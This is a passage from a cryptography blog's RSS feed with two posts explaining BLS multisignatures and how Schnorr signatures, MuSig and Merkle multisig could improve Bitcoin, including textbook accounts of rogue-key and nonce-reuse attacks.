want to lose all our money just because we’ve lost one of our keys. It would be nice to use key aggregation in this scenario. With Schnorr signatures we were able to do so by using merkle tree of public keys. It is not the most efficient way, but it kinda works. Unfortunately, as soon as you go to high <strong><em>m</em></strong> and <strong><em>n</em></strong> values, merkle tree size blows up exponentially.</p><p data-selectable-paragraph="">With BLS signature scheme there is another method. It’s not that simple though. We will need a normal hash function that outputs a number — <strong><em>hash(x)</em></strong>, and a hash to the curve — <strong><em>H(x)</em></strong>. We will also need a “setup” phase when we decide to use multisig, but after this we don’t need to communicate anymore — we only need signatures to sign any amount of transactions.</p><p data-selectable-paragraph="">Again I will use a simple example where we want to construct 2-of-3 multisig scheme with keys stored on 3 different devices, but it can be extended to any values of <strong><em>m</em></strong> and <strong><em>n</em></strong>.</p><p data-selectable-paragraph=""><b>Setup phase</b></p><p data-selectable-paragraph="">Each of our devices has a signer’s number <strong><em>i = 1,2,3 </em></strong>that represent its place in a set, a private key <strong><em>pki </em></strong>and a corresponding public key <strong><em>Pi = pki×G</em></strong>. We calculate an aggregated public key exactly the same way as before:</p><p data-selectable-paragraph=""><strong><em>P = a1×P1+a2×P2+a3×P3, ai = hash(Pi, {P1,P2,P3})</em></strong></p><p data-selectable-paragraph="">Now every device needs to sign that number <strong><em>i</em></strong> is a member of our aggregated public key (for every <strong><em>i</em></strong>), aggregate these signatures and save the result on corresponding device:</p><p data-selectable-paragraph=""><strong><em>MKi = (a1⋅pk1)×H(P, i)+(a2⋅pk2)×H(P, i)+(a3⋅pk3)×H(P, i)</em></strong></p><p data-selectable-paragraph="">This signature we will call a “membership key” and we will use it later on for signing. Each membership key is a valid n-of-n signature of the message <strong><em>H(P,i)</em></strong>, it means that:</p><p data-selectable-paragraph=""><strong><em>e(G, MKi)=e(P, H(P,i))</em></strong></p><p data-selectable-paragraph="">Remember this equation, we will need it later. It will be used to prove that we are valid participants of the multisignature scheme.</p><p data-selectable-paragraph=""><b>Signing</b></p><p data-selectable-paragraph="">Now let’s say we want to sign a transaction only with keys <strong><em>pk1</em></strong> and <strong><em>pk3</em></strong>. We generate two signatures <strong><em>S1</em></strong> and <strong><em>S3</em></strong><em>:</em></p><p data-selectable-paragraph=""><strong><em>S1 = pk1×H(P, m)+MK1</em></strong>, <strong><em>S3=pk3×H(P, m)+MK3</em></strong></p><p data-selectable-paragraph="">and add them up to obtain single signature and key:</p><p data-selectable-paragraph=""><strong><em>(S’, P’) = (S1+S3, P1+P3)</em></strong></p><p data-selectable-paragraph="">I write <strong><em>P’</em></strong> and <strong><em>S’</em></strong> here to emphasise that this key and signature are signed only by <em>a subset </em>of signers and it not the same as <strong><em>P</em></strong> that is an aggregated key for <em>all signers</em>. To verify this 2-of-3 signature we need to check that:</p><p data-selectable-paragraph=""><strong><em>e(G, S’) = e(P’, H(P, m))⋅e(P, H(P, 1)+H(P, 3))</em></strong></p><p data-selectable-paragraph="">We remember that membership keys <strong><em>MK1</em></strong> and <strong><em>MK3</em></strong> are valid signatures for messages <strong><em>H(P, 1)</em></strong> and <strong><em>H(P, 3)</em></strong> signed by aggregated key <strong><em>P</em></strong>, so:</p><p data-selectable-paragraph=""><strong><em>e(G, S’) = e(G, S1+S3)=e(G, pk1×H(P, m)+pk3×H(P, m)+MK1+MK3) =e(G, pk1×H(P, m)+pk3×H(P, m))⋅e(G, MK1+MK3)=e(pk1×G+pk3×G, H(P, m))⋅e(P, H(P, 1)+H(P, 3))=e(P’, H(P, m))⋅e(P, H(P, 1)+H(P, 3))</em></strong></p><p data-selectable-paragraph="">That’s it. A bit more complicated than n-of-n, but still understandable.</p><p data-selectable-paragraph=""><b>Possible implementation</b></p><p data-selectable-paragraph="">To implement this multisignature scheme we will need to send money to an address corresponding to an aggregated public key <strong><em>P</em></strong> and say that we need at least two signatures. In Bitcoin scripting language locking script could look like this:</p><p data-selectable-paragraph=""><strong><em>OP_2 &lt;P&gt; OP_CHECK_BLS_MULTISIG</em></strong></p><p data-selectable-paragraph="">Here <strong><em>OP_2</em></strong> tells that we require two keys to sign the message. We don’t say anywhere that there are 3 signers in total, so one can’t say if it is 2-of-3 or 2-of-100 multisig address. We also don’t reveal this information later.</p><p data-selectable-paragraph="">To spend this output we need to provide a key <strong><em>P’</em></strong>, signature <strong><em>S’</em></strong> and indexes of participating signers — in our case numbers 1 and 3. Unlocking script could look like this:</p><p data-selectable-paragraph=""><strong><em>OP_1 OP_3 &lt;P’&gt; &lt;S’&gt;</em></strong></p><p data-selectable-paragraph="">Combining these scripts gives us all necessary information. From <strong><em>OP_1</em></strong> and <strong><em>OP_3</em></strong> we know that we need to calculate hashes <strong><em>H(P, 1)</em></strong> and <strong><em>H(P, 3)</em></strong>, and then we have everything we need to verify the transaction.</p><p data-selectable-paragraph="">This means that for <em>any </em><strong><em>m</em></strong><em> and </em><strong><em>n</em></strong> we need only:</p><ul><li data-selectable-paragraph="">one aggregated public key <strong><em>P</em></strong> in the locking script</li><li data-selectable-paragraph="">one aggregated public key of participating signers <strong><em>P’</em></strong></li><li data-selectable-paragraph="">one aggregated signature <strong><em>S’</em></strong></li><li data-selectable-paragraph=""><strong><em>m</em></strong> numbers with signer’s indexes.</li></ul><p data-selectable-paragraph="">It is very compact and beautiful!</p><p data-selectable-paragraph="">There is only one thing that I don’t like here… Normally we use addresses only once — we use key derivation like BIP32 to generate new private keys and addresses. But for every new set of private keys we also need a set of new membership keys. One way to do it without running through setup phase every time is to generate a bunch of keys, like 1000 of them and get corresponding membership keys. After all, they are just 32-byte long. Then we will need to run the setup phase again only when all 1000 addresses are used.</p><h3 data-selectable-paragraph=""> </h3><h3 data-selectable-paragraph=""><b>Drawbacks</b></h3><p data-selectable-paragraph="">As it was pointed out in the comments here and on twitter, I skipped one important part and made you think that BLS signatures are perfect. They are not. And thanks a lot for bringing this up!</p><p data-selectable-paragraph=""><em>Pairing is hard</em>. I completely skipped that part and we considered that our magic function <strong><em>e(P, Q)</em></strong> is efficient and secure. It is not exactly true.</p><p data-selectable-paragraph=""><b>Paring is not so efficient</b></p><p data-selectable-paragraph="">BLS signature verification is order of magnitude harder than ECDSA. Signature aggregation for the whole block with 1000 transactions still requires to compute 1000 pairing, so verifying one tiny signature in a block may take longer than verifying 1000 separate ECDSA signatures. The only benefit we achieve here is that we can fit more transactions in the block as aggregated signature takes only ~32 bytes.</p><p data-selectable-paragraph="">Unlike BLS, Schnorr signatures are very efficient — they can be validated all together and this process is factor of 3 more efficient than ECDSA. The question then arises: what is more important for us?</p><p data-selectable-paragraph=""><b>Security proof is harder</b></p><p data-selectable-paragraph="">Pairing functions are complicated, and it can become our foe if we are not careful enough. On the one hand we want pairing to be efficient to verify signatures faster, on the other hand we don’t want to reveal any information about our secret key. These two requirements fight each other and we need to be extremely careful with our choice of pairing-friendly curves.</p><p data-selectable-paragraph="">There is actually an attack on elliptic curve crypto systems, called <a href="https://sci-hub.tw/https://ieeexplore.ieee.org/document/259647/" target="_blank" rel="noopener nofollow">MOV attack</a> (named after Menezes, Okamoto, and Vanstone), that allows to reduce security of the system by using our magic pairing function. So we really need to be careful here.</p><h3 data-selectable-paragraph=""> </h3><h3 data-selectable-paragraph=""><b>Conclusion</b></h3><p data-selectable-paragraph="">BLS signatures are amazing — we can combine all signatures in a block to a single signature, we can use key aggregation and m-of-n multisig scheme without additional communication rounds, we don’t need to rely on random number generators and the scheme itself looks very nice and simple. There is still room for improvement, standardising and optimising everything will take some time. But I hope at some point this signature algorithm will become good enough to be included in the Bitcoin protocol and we will be able to use all these nice features with smaller and more aggregatable signatures.</p><p data-selectable-paragraph="">I am very excited to see the first author Dan Boneh working on cryptocurrencies. He is a great cryptographer and his <a href="https://www.coursera.org/learn/crypto" target="_blank" rel="noopener nofollow">coursera crypto course</a> is outstanding. I also recommend his <a href="http://toc.cryptobook.us/" target="_blank" rel="noopener nofollow">crypto book</a> even though it’s not finished yet. I am sure we will see many interesting schemes and protocol improvements from him and his team in the near future.</p>					</div>
						</div>
				</div>
						</div>
					</div>
		</div>
								</div>
					</div>
		</section>
									</div>
			</div>
					</div>
		]]></content:encoded>
					
		
		
			</item>
		<item>
		<title>How Schnorr signatures may improve Bitcoin</title>
		<link>https://specter.solutions/how-schnorr-signatures-may-improve-bitcoin/</link>
		
		<dc:creator><![CDATA[Stepan Snigirev]]></dc:creator>
		<pubDate>Sat, 23 Jun 2018 22:09:26 +0000</pubDate>
				<category><![CDATA[Bitcoin]]></category>
		<category><![CDATA[Blockchain]]></category>
		<category><![CDATA[Cryptography]]></category>
		<category><![CDATA[Math]]></category>
		<guid isPermaLink="false">https://specter.solutions/?p=3703</guid>

					<description><![CDATA[When I was reading the MuSig paper from Blockstream I was trying to imagine what would it mean for me as a bitcoin user. Some features of the Schnorr signatures I found really great and convenient, but others are pretty annoying. Here I want to share my thoughts with you, but first, a quick recap: &#8230;<p class="read-more"> <a class="" href="https://specter.solutions/how-schnorr-signatures-may-improve-bitcoin/"> <span class="screen-reader-text">How Schnorr signatures may improve Bitcoin</span> Read More &#187;</a></p>]]></description>
										<content:encoded><![CDATA[		<div data-elementor-type="wp-post" data-elementor-id="3703" class="elementor elementor-3703">
						<div class="elementor-inner">
				<div class="elementor-section-wrap">
									<section class="elementor-section elementor-top-section elementor-element elementor-element-3f79218 elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="3f79218" data-element_type="section">
						<div class="elementor-container elementor-column-gap-default">
							<div class="elementor-row">
					<div class="elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-115b6f5" data-id="115b6f5" data-element_type="column">
			<div class="elementor-column-wrap elementor-element-populated">
							<div class="elementor-widget-wrap">
						<div class="elementor-element elementor-element-0c072e9 elementor-widget elementor-widget-text-editor" data-id="0c072e9" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
								<div class="elementor-text-editor elementor-clearfix">
				<p data-selectable-paragraph="">When I was reading the <a href="https://eprint.iacr.org/2018/068.pdf" target="_blank" rel="noopener nofollow">MuSig</a> paper from Blockstream I was trying to imagine what would it mean for me as a bitcoin user. Some features of the Schnorr signatures I found really great and convenient, but others are pretty annoying. Here I want to share my thoughts with you, but first, a quick recap:</p><h3 data-selectable-paragraph=""> </h3><h3 data-selectable-paragraph=""><b>Elliptic Curve Digital Signature Algorithm</b></h3><p data-selectable-paragraph="">Currently in Bitcoin we use <a href="https://en.wikipedia.org/wiki/Elliptic_Curve_Digital_Signature_Algorithm" target="_blank" rel="noopener nofollow">ECDSA</a>. To sign a message <strong><em>m</em></strong> we hash it and treat this hash as a number: <strong><em>z = hash(m)</em></strong>. We also need a random or random-looking number <strong><em>k</em></strong>. We prefer not to trust random number generators (too many failures and vulnerabilities are related to bad RGNs) so we usually use <a href="https://tools.ietf.org/html/rfc6979" target="_blank" rel="noopener nofollow">RFC6979</a> to calculate <strong><em>deterministic k</em></strong> based on our secret and the message we are signing.</p><p data-selectable-paragraph="">Using a private key <strong><em>pk</em></strong> we can generate a signature for message <strong><em>m</em></strong> consisting of two numbers: <strong><em>r</em></strong> (<strong><em>x</em></strong> coordinate of the random point <strong><em>R = k×G</em></strong>) and <strong><em>s = (z+r⋅pk)/k</em></strong>. Then, using our public key <strong><em>P = pk×G</em></strong> anyone can verify our signature by checking that point <strong><em>(z/s)×G+(r/s)×P</em></strong> has <strong><em>x </em></strong>coordinate equal to <strong><em>r</em></strong>.</p>					</div>
						</div>
				</div>
				<div class="elementor-element elementor-element-510ab4e elementor-widget elementor-widget-image" data-id="510ab4e" data-element_type="widget" data-widget_type="image.default">
				<div class="elementor-widget-container">
								<div class="elementor-image">
									<figure class="wp-caption">
										<img loading="lazy" decoding="async" width="991" height="1024" src="https://specter.solutions/wp-content/uploads/2021/01/1-aWEbhqQIpHXZgvNpRSi54g@2x-991x1024.png" class="attachment-large size-large" alt="" srcset="https://specter.solutions/wp-content/uploads/2021/01/1-aWEbhqQIpHXZgvNpRSi54g@2x-991x1024.png 991w, https://specter.solutions/wp-content/uploads/2021/01/1-aWEbhqQIpHXZgvNpRSi54g@2x-290x300.png 290w, https://specter.solutions/wp-content/uploads/2021/01/1-aWEbhqQIpHXZgvNpRSi54g@2x-768x793.png 768w, https://specter.solutions/wp-content/uploads/2021/01/1-aWEbhqQIpHXZgvNpRSi54g@2x-600x620.png 600w, https://specter.solutions/wp-content/uploads/2021/01/1-aWEbhqQIpHXZgvNpRSi54g@2x.png 1400w" sizes="(max-width: 991px) 100vw, 991px" />											<figcaption class="widget-image-caption wp-caption-text">Visualisation of the ECDSA algorithm. Elliptic curve is plotted over real numbers for illustration purposes.</figcaption>
										</figure>
								</div>
						</div>
				</div>
				<div class="elementor-element elementor-element-ae98166 elementor-widget elementor-widget-text-editor" data-id="ae98166" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
								<div class="elementor-text-editor elementor-clearfix">
				<p data-selectable-paragraph="">This algorithm is very common and pretty nice but it can be improved. First, signature verification includes inversion (<strong><em>1/s</em></strong>) and two points multiplications and these operations are very computationally heavy. In Bitcoin every node has to verify all the transactions. This means that when you broadcast a transaction, thousands of computers will have to verify your signature. Making verification process simpler will be very beneficial even if signing process is harder.</p><p data-selectable-paragraph="">Second, every node has to verify every signature separately. In case of m-of-n multisig transaction node may even have to verify the same signature several times. For example, transaction with 7-of-11 multisig input will contain 7 signatures and require from 7 to 11 signature verifications <em>on every node</em> in the network. Also such transaction will take a huge amount of space in the block and you will have to pay large fees for that.</p><h3 data-selectable-paragraph=""> </h3><h3 data-selectable-paragraph=""><b>Schnorr signatures</b></h3><p data-selectable-paragraph="">Schnorr signatures are generated slightly differently. Instead of two scalars <strong><em>(r,s)</em></strong> we use a point <strong><em>R</em></strong> and a scalar <strong><em>s</em></strong>. Similar to ECDSA, <strong><em>R</em></strong> is a random point on elliptic curve (<strong><em>R = k×G</em></strong>). Second part of the signature is calculated slightly differently: <strong><em>s = k + hash(P,R,m) ⋅ pk</em></strong>. Here <strong><em>pk</em></strong> is your private key, <strong><em>P = pk×G </em></strong>is your public key, <strong><em>m</em></strong> is the message. Then one can verify this signature by checking that <strong><em>s×G = R + hash(P,R,m)×P</em></strong>.</p>					</div>
						</div>
				</div>
				<div class="elementor-element elementor-element-ed9fca2 elementor-widget elementor-widget-image" data-id="ed9fca2" data-element_type="widget" data-widget_type="image.default">
				<div class="elementor-widget-container">
								<div class="elementor-image">
									<figure class="wp-caption">
										<img loading="lazy" decoding="async" width="1024" height="956" src="https://specter.solutions/wp-content/uploads/2021/01/1-hIjYiOdjwBVqdRpa5lrJOg@2x-1024x956.png" class="attachment-large size-large" alt="" srcset="https://specter.solutions/wp-content/uploads/2021/01/1-hIjYiOdjwBVqdRpa5lrJOg@2x-1024x956.png 1024w, https://specter.solutions/wp-content/uploads/2021/01/1-hIjYiOdjwBVqdRpa5lrJOg@2x-300x280.png 300w, https://specter.solutions/wp-content/uploads/2021/01/1-hIjYiOdjwBVqdRpa5lrJOg@2x-768x717.png 768w, https://specter.solutions/wp-content/uploads/2021/01/1-hIjYiOdjwBVqdRpa5lrJOg@2x-600x560.png 600w, https://specter.solutions/wp-content/uploads/2021/01/1-hIjYiOdjwBVqdRpa5lrJOg@2x.png 1400w" sizes="(max-width: 1024px) 100vw, 1024px" />											<figcaption class="widget-image-caption wp-caption-text">Visualisation of the Schnorr signature verification.</figcaption>
										</figure>
								</div>
						</div>
				</div>
				<div class="elementor-element elementor-element-7e57c62 elementor-widget elementor-widget-text-editor" data-id="7e57c62" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
								<div class="elementor-text-editor elementor-clearfix">
				<p id="7439" class="gk gl dn gm b gn go gp gq gr gs gt gu gv gw gx gy gz ha hb hc hd he hf hg hh dg ch" data-selectable-paragraph="">This equation is linear, so equations can be added and subtracted with each other and still stay valid. This brings us to several nice features of Schnorr signatures that we can use.</p><p id="8907" class="jp hk dn au av jq jr js hn jt ju jv hq jw jx jy hu jz ka kb hy kc kd ke ic kf ch" data-selectable-paragraph=""><b>1. Batch validation</b></p><p id="2bc6" class="gk gl dn gm b gn ie gp gq gr if gt gu gv ig gx gy gz ih hb hc hd ii hf hg hh dg ch" data-selectable-paragraph="">To verify a block in Bitcoin blockchain we need to make sure that <em class="ik">all</em> signatures in the block are valid. If one of them is not valid we don’t care which one — we just reject the whole block and that’s it.</p><p id="02ff" class="gk gl dn gm b gn go gp gq gr gs gt gu gv gw gx gy gz ha hb hc hd he hf hg hh dg ch" data-selectable-paragraph="">With ECDSA every signature has to be verified separately. Meaning that if we have 1000 signatures in the block we will need to compute 1000 inversions and 2000 point multiplications. In total ~3000 heavy operations.</p><p id="7e75" class="gk gl dn gm b gn go gp gq gr gs gt gu gv gw gx gy gz ha hb hc hd he hf hg hh dg ch" data-selectable-paragraph="">With Schnorr signatures we can add up all the signature verification equations and save some computational power. In total for a block with 1000 transactions we need to verify that:</p><p id="e4c6" class="gk gl dn gm b gn go gp gq gr gs gt gu gv gw gx gy gz ha hb hc hd he hf hg hh dg ch" data-selectable-paragraph=""><strong class="gm ij"><em class="ik">(s1+s2+…+s1000)×G=(R1+…+R1000)+(hash(P1,R1,m1)×P1+ hash(P2,R2,m2)×P2+…+hash(P1000,R1000,m1000)×P1000)</em></strong></p><p id="3619" class="gk gl dn gm b gn go gp gq gr gs gt gu gv gw gx gy gz ha hb hc hd he hf hg hh dg ch" data-selectable-paragraph="">Here we have a bunch of point additions (almost free in sense of computational power) and 1001 point multiplication. This is already a factor of 3 improvement — we need to compute roughly one heavy operation per signature.</p>					</div>
						</div>
				</div>
				<div class="elementor-element elementor-element-8e2f49f elementor-widget elementor-widget-image" data-id="8e2f49f" data-element_type="widget" data-widget_type="image.default">
				<div class="elementor-widget-container">
								<div class="elementor-image">
									<figure class="wp-caption">
										<img loading="lazy" decoding="async" width="1024" height="364" src="https://specter.solutions/wp-content/uploads/2021/01/1-ZVUPaZBVXs-ORSI_rrh0fw@2x-1024x364.png" class="attachment-large size-large" alt="" srcset="https://specter.solutions/wp-content/uploads/2021/01/1-ZVUPaZBVXs-ORSI_rrh0fw@2x-1024x364.png 1024w, https://specter.solutions/wp-content/uploads/2021/01/1-ZVUPaZBVXs-ORSI_rrh0fw@2x-300x107.png 300w, https://specter.solutions/wp-content/uploads/2021/01/1-ZVUPaZBVXs-ORSI_rrh0fw@2x-768x273.png 768w, https://specter.solutions/wp-content/uploads/2021/01/1-ZVUPaZBVXs-ORSI_rrh0fw@2x-1536x546.png 1536w, https://specter.solutions/wp-content/uploads/2021/01/1-ZVUPaZBVXs-ORSI_rrh0fw@2x-2048x728.png 2048w, https://specter.solutions/wp-content/uploads/2021/01/1-ZVUPaZBVXs-ORSI_rrh0fw@2x-600x213.png 600w" sizes="(max-width: 1024px) 100vw, 1024px" />											<figcaption class="widget-image-caption wp-caption-text">Batch validation of two signatures. As verification equation is linear the sum of several equations is valid as soon as all signatures are valid. We save some computational power as scalar and point additions are much easier than point multiplication.</figcaption>
										</figure>
								</div>
						</div>
				</div>
				<div class="elementor-element elementor-element-7d20e8b elementor-widget elementor-widget-text-editor" data-id="7d20e8b" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
								<div class="elementor-text-editor elementor-clearfix">
				<p data-selectable-paragraph=""><b>2. Key aggregation</b></p><p data-selectable-paragraph="">We want to keep our bitcoins safe, so we might want to use at least two different private keys to control bitcoins. One we will use on a laptop or a phone and another one — on a hardware wallet / cold wallet. So when one of them is compromised we still have control over our bitcoins.</p><p data-selectable-paragraph="">Currently it is implemented via 2-of-2 multisig script. This requires two separate signatures to be included in the transaction.</p><p data-selectable-paragraph="">With Schnorr signatures we can use a pair of private keys <strong><em>(pk1,pk2)</em></strong> and generate a shared signature corresponding to a shared public key <strong><em>P=P1+P2=pk1×G+pk2×G</em></strong>. To generate this signature we need to choose a random number on every device <strong><em>(k1,k2)</em></strong>, generate a random point <strong><em>Ri=ki×G</em></strong>, add them up to calculate a common <strong><em>hash(P,R1+R2,m)</em></strong> and then get <strong><em>s1</em></strong> and <strong><em>s2</em></strong> from every device (<strong><em>si = ki + hash(P,R,m) ⋅ pki</em></strong>). Then we can add up these signatures and use a pair <strong><em>(R, s) = (R1+R2, s1+s2)</em></strong> as our signature for shared public key <strong><em>P</em></strong>. Everyone else won’t be able to say if it is an aggregated signature or not — it looks exactly the same as a normal Schnorr signature.</p><p data-selectable-paragraph="">There are three problems with this construction. First one — from UI point of view. To make a transaction we need several communication rounds — to calculate common <strong><em>R</em></strong>, and then — to sign. With two private keys it can be done with a single access to the cold wallet: we prepare an unsigned transaction on our online wallet, choose <strong><em>k1</em></strong> and write down <strong><em>R1=k1×G </em></strong>together with the unsigned transaction. Then we transfer this data to the cold wallet and sign. As we already have <strong><em>R1</em></strong> we can sign transaction on the cold wallet in one run. From the cold wallet we get <strong><em>R2 </em></strong>and <strong><em>s2</em></strong> which we transfer back to the online wallet. Online wallet signs the transaction with previously chosen <strong><em>(k1, R1)</em></strong>, combines both signatures and broadcasts a signed transaction. This is pretty much similar to what we have now, but as soon as you add a third private key everything becomes more complicated. Imagine you have a fortune that is controlled by 10 private keys stored in different secure places around the world and you need to make a transaction. Currently you need to go over all these places only once, but if you are using key aggregation you need to do it twice — to assemble all <strong><em>Ri</em></strong> and then to sign. In this case it would probably be better to stay with separate signatures without aggregation — then only one round is necessary.</p><p data-selectable-paragraph=""><em>Post update, thanks to Manu Drijvers for bringing this up</em>:<em> for a provably secure multisignature scheme you need 3 communication rounds:</em></p><ul><li data-selectable-paragraph=""><em>Choose a random number </em><strong><em>ki</em></strong><em> and corresponding </em><strong><em>Ri=ki×G</em></strong><em> and tell everyone only it’s hash </em><strong><em>ti=hash(Ri)</em></strong><em>, so that everyone can be sure that you will not change your mind after learning other’s random numbers,</em></li><li data-selectable-paragraph=""><em>Gather all the numbers </em><strong><em>Ri</em></strong><em> together and calculate common </em><strong><em>R</em></strong></li><li data-selectable-paragraph=""><em>Sign</em></li></ul><p data-selectable-paragraph="">Second problem is a known Rogue key attack. It is nicely described in the paper or <a href="https://bitcointechtalk.com/scaling-bitcoin-schnorr-signatures-abe3b5c275d1" target="_blank" rel="noopener nofollow">here</a>, so I won’t go into details. The idea is that if one of your devices is hacked (say, your online wallet) and pretends that its public key is <strong><em>(P1-P2)</em></strong> then it can control shared funds with its private key <strong><em>pk1</em></strong>. A simple solution is to require a public key to be signed with corresponding private key when we are setting up the devices.</p><p data-selectable-paragraph="">And there is a third important problem. <em>You can’t use deterministic k</em> <em>for signing</em>. There is a simple attack that allows a hacker to get our private key if you are using deterministic <strong><em>k</em></strong>. Attack looks like this: someone hacked our laptop and has a complete control over one of two private keys (say, <strong><em>pk1</em></strong>). We feel safe as our bitcoins require an aggregated signature from both <strong><em>pk1</em></strong> and <strong><em>pk2</em></strong>. So we are trying to make a transaction as usual, prepare an unsigned transaction and <strong><em>R1</em></strong> value, transfer them to our hardware wallet and sign there. Then transfer back <strong><em>(R2, s2)</em></strong> and… something happened to our online wallet and it fails to sign and broadcast. We try to do it again, but our hacked computer uses another random value this time — <strong><em>R1&#8242;</em></strong>. We sign the same transaction with our hardware wallet again and bring values <strong><em>(R2, s2&#8242;)</em></strong> back to our hacked computer. Ups, we’ve lost all our bitcoins.</p><p data-selectable-paragraph="">In this attack hacker gets a pair of valid signatures for the same transaction: <strong><em>(R1, s1, R2, s2)</em></strong> and <strong><em>(R1&#8242;, s1&#8242;, R2, s2&#8242;)</em></strong>. Here <strong><em>R2</em></strong> is the same, but <strong><em>R = R1+R2</em></strong> and <strong><em>R&#8217;=R1&#8217;+R2</em></strong> are different. This means that the hacker can calculate our second private key: <strong><em>s2-s2&#8217;=(hash(P,R1+R2,m)-hash(P,R1&#8217;+R2,m))⋅pk2</em></strong> and <strong><em>pk2=(s2-s2&#8242;)/(hash(P,R1+R2,m)-hash(P,R1&#8217;+R2,m))</em></strong>. I find this the most inconvenient feature of key aggregation — we will need to use a good random number generators everywhere to use key aggregation.</p><p data-selectable-paragraph=""><b>3. MuSig</b></p><p data-selectable-paragraph=""><a href="https://blockstream.com/2018/01/23/musig-key-aggregation-schnorr-signatures.html" target="_blank" rel="noopener nofollow">MuSig</a> solves one of these problem — it makes rogue key attack impossible. The goal is to aggregate signatures and public keys from several parties/devices to a single one but without proving that you have a private key corresponding to the public key.</p><p data-selectable-paragraph="">The aggregated signature corresponds to the aggregated public key. But instead of just adding up public keys of all co-signers we multiply them to some factor. The aggregated public key will be <strong><em>P=hash(L,P1)×P1+…+hash(L,Pn)×Pn</em></strong>. Here <strong><em>L=hash(P1,…,Pn)</em></strong> — a common number depending on all public keys. This nonlinearity prevents attacker from constructing a bad public key like in rogue key attack. Even though the attacker knows exactly what should be his <strong><em>hash(L,Patk)×Patk</em></strong>, he can’t derive <strong><em>Patk</em></strong> from it — it is the same problem as to derive the private key from the public key.</p><p data-selectable-paragraph="">The rest is pretty similar to the previous case. To generate a signature each co-signer choses a random number <strong><em>ki</em></strong> and shares <strong><em>Ri=ki×G</em></strong> with others. Then they add up all these random points to a single <strong><em>R=R1+…+Rn</em></strong> and generate a signature <strong><em>si = ki + hash(P,R,m) ⋅ hash(L,Pi) ⋅ pki</em></strong>. The aggregated signature is <strong><em>(R, s)=(R1+…+Rn, s1+…+sn)</em></strong> and verification equation is the same as before: <strong><em>s×G = R + hash(P,R,m)×P</em></strong>.</p><p data-selectable-paragraph=""><b>4. Merkle Multisig</b></p><p data-selectable-paragraph="">As you may have noticed, MuSig and key aggregation require <em>all signers to sign a transaction</em>. But what if you want to make a 2-of-3 multisig? Is it possible at all to use signature aggregation in this case, or we will have to use our usual OP_CHECKMULTISIG and separate signatures?</p><p data-selectable-paragraph="">Well, it is possible, but with a small change in the protocol. We can develop a new op-code similar to OP_CHECKMULTISIG that checks if aggregated signature corresponds to a particular item in the Merkle tree of public keys.</p><p data-selectable-paragraph="">For example, if we use a 2-of-3 multisig with public keys <strong><em>P1</em></strong>, <strong><em>P2</em></strong> and <strong><em>P3</em></strong>, then we need to construct a Merkle tree of aggregated public keys for all combinations we can use: <strong><em>(P1, P2)</em></strong>, <strong><em>(P2, P3)</em></strong>, <strong><em>(P1, P3)</em></strong> and put the root in the locking script. To spend bitcoins we provide a signature and a proof that our public key is in the tree. For 2-of-3 multisig there are only 3 elements in the tree and the proof will consist of two hashes — the one we want to use and its neighbour. For 7-of-11 multisig there will be already 11!/7!/4!=330 possible key combinations and the proof will require 8 elements. In general the number of elements in the proof scales almost linear with the number of keys in multisig (it’s <strong><em>log2(n!/m!/(n-m)! </em></strong>).</p><p data-selectable-paragraph="">But with the Merkle tree of public keys we are not limited to m-of-n multisigs. We can make a tree with any public keys we want. For example, if we have a laptop, a phone, a hardware wallet and a recovery seed we can construct a structure that would allow us to spend bitcoins with a laptop and a hardware wallet, a phone and a hardware wallet or just with a recovery seed. This is currently not possible just with OP_CHECKMULTISIG — only if you construct much more complicated script with branches and stuff.</p>					</div>
						</div>
				</div>
				<div class="elementor-element elementor-element-c435b58 elementor-widget elementor-widget-image" data-id="c435b58" data-element_type="widget" data-widget_type="image.default">
				<div class="elementor-widget-container">
								<div class="elementor-image">
									<figure class="wp-caption">
										<img loading="lazy" decoding="async" width="1024" height="425" src="https://specter.solutions/wp-content/uploads/2021/01/1-tIO2Vm-ZjS8JtsgKYT-Tww@2x-1024x425.png" class="attachment-large size-large" alt="" srcset="https://specter.solutions/wp-content/uploads/2021/01/1-tIO2Vm-ZjS8JtsgKYT-Tww@2x-1024x425.png 1024w, https://specter.solutions/wp-content/uploads/2021/01/1-tIO2Vm-ZjS8JtsgKYT-Tww@2x-300x125.png 300w, https://specter.solutions/wp-content/uploads/2021/01/1-tIO2Vm-ZjS8JtsgKYT-Tww@2x-768x319.png 768w, https://specter.solutions/wp-content/uploads/2021/01/1-tIO2Vm-ZjS8JtsgKYT-Tww@2x-600x249.png 600w, https://specter.solutions/wp-content/uploads/2021/01/1-tIO2Vm-ZjS8JtsgKYT-Tww@2x.png 1400w" sizes="(max-width: 1024px) 100vw, 1024px" />											<figcaption class="widget-image-caption wp-caption-text">Merkle tree of aggregated public keys. More than just m-of-n multisig.</figcaption>
										</figure>
								</div>
						</div>
				</div>
				<div class="elementor-element elementor-element-7ab0a1c elementor-widget elementor-widget-text-editor" data-id="7ab0a1c" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
								<div class="elementor-text-editor elementor-clearfix">
				<h3 data-selectable-paragraph=""><b>Conclusion</b></h3><p data-selectable-paragraph="">Schnorr signatures are great. They can save some computational power during block validation and also give us ability to use key aggregation. The last one has some inconveniences, but we aren’t forced to use them — after all, if we want we can continue using normal multisig schemes with separate, non-aggregated signatures and still gain something. I can’t wait to start using them and I hope they will be included in the Bitcoin protocol soon.</p><p data-selectable-paragraph="">I really liked the <a href="https://eprint.iacr.org/2018/068.pdf" target="_blank" rel="noopener nofollow">paper</a>, the MuSig scheme is smart and the paper itself is very easy to read. I would strongly recommend to look through it if you have time.</p><p data-selectable-paragraph="">P.S. There is also another nice type of signatures — BLS signatures. They look even better than Schnorr in some sense. If you want to know what BLS signatures are about, take a look at my <a href="https://medium.com/@snigirev.stepan/bls-signatures-better-than-schnorr-5a7fe30ea716" target="_blank" rel="noopener">next post</a>.</p>					</div>
						</div>
				</div>
						</div>
					</div>
		</div>
								</div>
					</div>
		</section>
									</div>
			</div>
					</div>
		]]></content:encoded>
					
		
		
			</item>
	</channel>
</rss>
